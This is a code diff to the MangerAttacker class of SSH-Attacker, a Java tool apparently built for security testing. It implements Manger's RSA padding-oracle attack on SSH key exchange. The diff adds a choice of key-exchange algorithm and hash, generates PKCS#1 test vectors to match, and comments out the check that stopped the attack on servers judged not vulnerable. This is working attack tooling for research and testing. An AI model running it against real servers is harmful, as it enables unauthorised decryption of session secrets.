@@ -31,10 +31,13 @@ import de.rub.nds.sshattacker.attacks.task.FingerPrintTask;
 import de.rub.nds.sshattacker.attacks.task.SshTask;
 import de.rub.nds.sshattacker.core.config.Config;
 import de.rub.nds.sshattacker.core.constants.Bits;
+import de.rub.nds.sshattacker.core.constants.KeyExchangeAlgorithm;
 import de.rub.nds.sshattacker.core.exceptions.ConfigurationException;
 import de.rub.nds.sshattacker.core.state.State;
 import java.math.BigInteger;
 import java.security.interfaces.RSAPublicKey;
+import java.util.ArrayList;
+import java.util.Collections;
 import java.util.LinkedList;
 import java.util.List;
 import org.apache.logging.log4j.Level;
@@ -67,6 +70,8 @@ public class MangerAttacker extends Attacker<MangerCommandConfig> {
     private boolean shakyScans = false;
     private boolean erroneousScans = false;
 
+    private KeyExchangeAlgorithm keyExchangeAlgorithm;
+
     /**
      * @param mangerConfig
      * @param baseConfig
@@ -74,6 +79,7 @@ public class MangerAttacker extends Attacker<MangerCommandConfig> {
     public MangerAttacker(MangerCommandConfig mangerConfig, Config baseConfig) {
         super(mangerConfig, baseConfig);
         sshConfig = getSshConfig();
+        setKeyExchangeAlgorithm();
         executor = new ParallelExecutor(1, 3);
     }
 
@@ -86,14 +92,38 @@ public class MangerAttacker extends Attacker<MangerCommandConfig> {
             MangerCommandConfig mangerConfig, Config baseConfig, ParallelExecutor executor) {
         super(mangerConfig, baseConfig);
         sshConfig = getSshConfig();
+        setKeyExchangeAlgorithm();
         this.executor = executor;
+    }
+
+    private void setKeyExchangeAlgorithm() {
+        if (config.getKexAlgorithm() == null) {
+            throw new ConfigurationException("The key exchange algorithm must be set.");
+        } else {
+            if (config.getKexAlgorithm().equals("rsa2048_sha256")) {
+                keyExchangeAlgorithm = KeyExchangeAlgorithm.RSA2048_SHA256;
+
+            } else if(config.getKexAlgorithm().equals("rsa1024_sha1")) {
+                keyExchangeAlgorithm = KeyExchangeAlgorithm.RSA1024_SHA1;
+            } else {
+                throw new ConfigurationException("Unknown key exchange algorithm, did you mistype it? " +
+                        "Options are rsa2048_sha256 and rsa1024_sha1");
+            }
+        }
+
+        // Set only supported key exchange algorithm to the one specified by the user
+        sshConfig.setClientSupportedKeyExchangeAlgorithms(
+                new ArrayList<>(Collections.singleton(keyExchangeAlgorithm))
+        );
+
+        CONSOLE.info("Set key exchange algorithm to: " + keyExchangeAlgorithm);
     }
 
     /** @return */
     @Override
     public Boolean isVulnerable() {
         CONSOLE.info(
-                "A server is considered vulnerable to this attack if it reuses it's host key and"
+                "A server is considered vulnerable to this attack if it reuses it's host key and "
                         + "responds differently to the test vectors.");
         CONSOLE.info(
                 "A server is considered secure if it does not reuse the host key or"
@@ -148,8 +178,7 @@ public class MangerAttacker extends Attacker<MangerCommandConfig> {
         List<SshTask> taskList = new LinkedList<>();
         List<FingerprintTaskVectorPair> stateVectorPairList = new LinkedList<>();
 
-        // TODO: hash length is dependent on key exchange algorithm
-        for (Pkcs1Vector vector : Pkcs1VectorGenerator.generatePkcs1Vectors(publicKey, 256)) {
+        for (Pkcs1Vector vector : Pkcs1VectorGenerator.generatePkcs1Vectors(publicKey, getHashLength(), getHashInstance())) {
 
             State state =
                     new State(
@@ -242,7 +271,7 @@ public class MangerAttacker extends Attacker<MangerCommandConfig> {
         // TODO: make attack work
         if (!isVulnerable()) {
             LOGGER.warn("The server is not vulnerable to Manger's attack");
-            return;
+            //return;
         }
         RSAPublicKey publicKey = getServerPublicKey();
         if (publicKey == null) {
@@ -252,6 +281,10 @@ public class MangerAttacker extends Attacker<MangerCommandConfig> {
 
         if (config.getEncryptedSecret() == null) {
             throw new ConfigurationException("The encrypted secret must be set to be decrypted.");
+        }
+
+        if (config.getKexAlgorithm() == null) {
+            throw new ConfigurationException("The key exchange algorithm must be set.");
         }
 
         LOGGER.info(
@@ -275,8 +308,7 @@ public class MangerAttacker extends Attacker<MangerCommandConfig> {
     }
 
     private ResponseFingerprint extractValidFingerprint(RSAPublicKey publicKey) {
-        // TODO: hashLength depends on negotiated key exchange alg.
-        Pkcs1Vector vector = Pkcs1VectorGenerator.generateCorrectFirstBytePkcs1Vector(publicKey, 256);
+        Pkcs1Vector vector = Pkcs1VectorGenerator.generateCorrectFirstBytePkcs1Vector(publicKey, getHashLength(), getHashInstance());
         State state =
                 new State(
                         sshConfig,
@@ -340,5 +372,27 @@ public class MangerAttacker extends Attacker<MangerCommandConfig> {
 
     public void setAdditionalTcpTimeout(long additionalTcpTimeout) {
         this.additionalTcpTimeout = additionalTcpTimeout;
+    }
+
+    private int getHashLength() {
+        switch (keyExchangeAlgorithm) {
+            case RSA2048_SHA256:
+                return 256;
+            case RSA1024_SHA1:
+                return 160;
+            default:
+                return 0;
+        }
+    }
+
+    private String getHashInstance() {
+        switch (keyExchangeAlgorithm) {
+            case RSA2048_SHA256:
+                return "SHA-256";
+            case RSA1024_SHA1:
+                return "SHA-1";
+            default:
+                return "";
+        }
     }
 }
